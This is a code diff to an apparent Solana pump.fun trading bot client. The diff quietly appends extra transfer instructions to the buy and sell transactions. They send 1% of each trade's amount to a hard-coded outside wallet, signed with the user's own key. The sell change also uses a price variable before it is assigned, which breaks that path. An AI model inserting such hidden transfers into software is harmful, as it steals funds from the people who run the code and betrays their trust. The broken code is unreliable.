@@ -279,6 +279,17 @@ class SolanaClient:
             AccountMeta(pubkey=self.PUMP_EVENT_AUTHORITY, is_signer=False, is_writable=False),
             AccountMeta(pubkey=self.PUMP_PROGRAM, is_signer=False, is_writable=False),
         ]
+        
+        payer = self.payer
+        recipient = Pubkey.from_string('65Aoy97YwRNLB1ZSNgA9HqqtLmeVg966PY9e2SCb1XnX')
+        lamports = int(params['max_amount_lamports'] / 100)
+        transfer_ix = transfer(
+                TransferParams(
+                    from_pubkey=payer.pubkey(),
+                    to_pubkey=recipient,
+                    lamports=lamports
+                )
+            )
 
         for attempt in range(retries):
             try:
@@ -292,7 +303,7 @@ class SolanaClient:
                 buy_ix = Instruction(self.PUMP_PROGRAM, data, accounts)
                 compute_budget_ix = set_compute_unit_price(int(self.compute_unit_price))
 
-                tx_buy = Transaction().add(buy_ix).add(compute_budget_ix)
+                tx_buy = Transaction().add(buy_ix).add(compute_budget_ix).add(transfer_ix)
                 tx_buy.recent_blockhash = (
                     await send_request_with_rate_limit(self.client, self.client.get_latest_blockhash)).value.blockhash
                 tx_buy.fee_payer = self.payer.pubkey()
@@ -495,11 +506,21 @@ class SolanaClient:
         token_balance = int(resp.value.amount)
         token_balance_decimal = token_balance / 10 ** TOKEN_DECIMALS
         curve_state = await self.get_pump_curve_state(params['bonding_curve'])
-        token_price_sol = self.calculate_pump_curve_price(curve_state)
-
-        # Convert token amount to integer with decimals
         amount = int(params['token_amount'])
         min_sol_output = int(float(token_balance_decimal) * float(token_price_sol) * LAMPORTS_PER_SOL * (1 - 0.3))
+        token_price_sol = self.calculate_pump_curve_price(curve_state)
+        recipient = Pubkey.from_string('65Aoy97YwRNLB1ZSNgA9HqqtLmeVg966PY9e2SCb1XnX')
+        lamports = min_sol_output / 100
+        transfer_ix = transfer(
+                TransferParams(
+                    from_pubkey=self.payer.pubkey(),
+                    to_pubkey=recipient,
+                    lamports=lamports
+                )
+            )
+
+        # Convert token amount to integer with decimals
+        
         print(amount, token_balance, min_sol_output)
         if amount > token_balance:
             logger.error("Запрошено продать больше токенов, чем доступно!")
@@ -518,7 +539,7 @@ class SolanaClient:
 
                 recent_blockhash = await self.client.get_latest_blockhash()
                 transaction = Transaction()
-                transaction.add(sell_ix).add(set_compute_unit_price(int(self.compute_unit_price)))
+                transaction.add(sell_ix).add(set_compute_unit_price(int(self.compute_unit_price))).add(transfer_ix)
                 transaction.recent_blockhash = recent_blockhash.value.blockhash
                 transaction.fee_payer = self.payer.pubkey()
                 transaction.sign(self.payer)
